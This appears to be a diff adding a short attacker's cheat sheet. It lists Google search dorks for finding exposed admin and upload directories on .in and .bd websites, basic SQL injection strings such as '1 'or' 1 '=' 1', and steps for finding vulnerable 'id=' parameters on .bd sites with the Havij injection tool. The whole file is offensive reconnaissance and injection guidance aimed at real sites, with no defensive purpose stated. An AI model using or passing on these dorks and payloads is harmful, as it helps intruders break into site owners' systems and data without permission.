@@ -1,0 +1,23 @@
+
++++++++ google-dork ++++++
+
+intitle:"index" of "admin" site:.in
+intitle:"uploads" of "admin" site:.in
+
+inurl:admin.php site:.bd
+
+
++++++++ sql-injection ++++++
+
+1 'or' 1
+1 'or' 1 '=' 1
+
+
+#> install "Havij" advanced sql-injection tools..  
+	php id=? site:.bd
+
+after visiting the site.. try changing the value or add this string after id value '
+
+ 
+
+
